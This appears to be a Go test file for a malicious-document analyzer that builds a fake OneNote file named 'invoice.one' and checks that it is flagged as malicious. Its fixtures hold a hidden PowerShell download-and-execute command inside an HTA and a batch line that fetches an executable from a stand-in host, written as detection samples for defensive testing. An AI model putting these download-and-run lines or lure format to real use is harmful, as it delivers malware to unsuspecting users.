package maldoctrace

import (
	"context"
	"encoding/binary"
	"strings"
	"testing"

	"github.com/debugactiveprocess/MaldocTrace/extractor"
)

var (
	oneMagic    = []byte{0xE4, 0x52, 0x5C, 0x7B, 0x8C, 0xD8, 0xA7, 0x4D, 0xAE, 0xB1, 0x53, 0x78, 0xD0, 0x29, 0x96, 0xD3}
	oneFileData = []byte{0xE7, 0x16, 0xE3, 0xBD, 0x65, 0x26, 0x11, 0x45, 0xA4, 0xC4, 0x8D, 0x4D, 0x0B, 0x7A, 0x9E, 0xAC}
)

func oneFile(data []byte) []byte {
	b := append([]byte(nil), oneFileData...)
	b = binary.LittleEndian.AppendUint64(b, uint64(len(data)))
	b = append(b, make([]byte, 12)...)
	b = append(b, data...)
	return append(b, make([]byte, 16)...) // footer GUID
}

func TestOneNoteEmbeddedFiles(t *testing.T) {
	hta := "<html><head><HTA:APPLICATION ID=\"x\"/><script language=\"VBScript\">\r\n" +
		"CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -c iwr http://example.invalid/s.ps1 | iex\"\r\nself.close\r\n</script></head></html>"
	data := append(append([]byte(nil), oneMagic...), make([]byte, 64)...)
	data = append(data, oneFile([]byte{0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0, 0})...)
	data = append(data, oneFile([]byte(hta))...)
	data = append(data, oneFile([]byte("@echo off\r\ncurl -o %TEMP%\\a.exe http://example.invalid/a.exe\r\n"))...)
	data = append(data, oneFile(templateDocx(t))...)
	if extractor.DetectContainer(data) != "onenote" {
		t.Fatal("OneNote not detected")
	}
	r := AnalyzeFromBytes(context.Background(), data, "invoice.one", Options{})
	if r.Format != "onenote" || r.Verdict != "malicious" {
		t.Fatalf("format %s verdict %s %v", r.Format, r.Verdict, r.VerdictReasons)
	}
	if len(r.Artifacts) != 3 {
		t.Fatalf("artifacts %+v", r.Artifacts)
	}
	var hasHTA, hasBat bool
	for _, a := range r.Artifacts {
		hasHTA = hasHTA || strings.HasSuffix(a.Name, ".hta") && strings.Contains(a.FileType, "HTA")
		hasBat = hasBat || strings.HasSuffix(a.Name, ".bat")
	}
	if !hasHTA || !hasBat {
		t.Fatalf("classification: %+v", r.Artifacts)
	}
	if len(r.Commands) < 2 || !hasIOCType(r, "url", "http://example.invalid/s.ps1") || !hasIOCType(r, "url", "http://example.invalid/a.exe") {
		t.Fatalf("commands %+v iocs %+v", r.Commands, r.Indicators)
	}
	if len(r.Children) != 1 || !hasFindingSev(r.Children[0].Report, "template_injection", "high") {
		t.Fatalf("children %+v", r.Children)
	}
}

func FuzzOneNote(f *testing.F) {
	f.Add(append(append([]byte(nil), oneMagic...), oneFile([]byte("@echo off"))...))
	f.Fuzz(func(t *testing.T, b []byte) {
		extractor.OneNoteFiles(b)
	})
}
